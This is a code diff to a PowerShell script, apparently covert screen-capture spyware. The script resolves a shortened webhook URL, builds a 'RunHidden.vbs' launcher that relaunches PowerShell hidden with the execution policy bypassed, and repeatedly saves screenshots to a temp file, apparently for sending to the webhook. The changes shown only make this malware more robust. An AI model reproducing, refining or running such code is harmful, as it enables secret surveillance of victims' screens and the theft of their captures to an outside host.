@@ -4,12 +4,21 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL detectd..."
+    Write-Host "Shortened Webhook URL Detected..."
     $hookurl = (irm $hookurl).url
 }
 
 # Obtener la ruta del directorio donde se encuentra este script
-$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.ScriptFullName
+$scriptDirectory = $PSScriptRoot
+if (-not $scriptDirectory) {
+    $scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
+}
+
+# Verificar si la ruta del directorio está definida
+if (-not $scriptDirectory) {
+    Write-Host "No se puede determinar la ruta del directorio del script."
+    exit
+}
 
 # Obtener la ruta del archivo de VBScript
 $vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
@@ -23,7 +32,7 @@ WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$($MyInvocation.MyC
 }
 
 do {
-    $Filett = "$env:temp\SC.png"
+    $Filett = Join-Path -Path $env:temp -ChildPath "SC.png"
     # Verificar si el archivo ya existe antes de crear uno nuevo
     if (-not (Test-Path $Filett)) {
         Add-Type -AssemblyName System.Windows.Forms
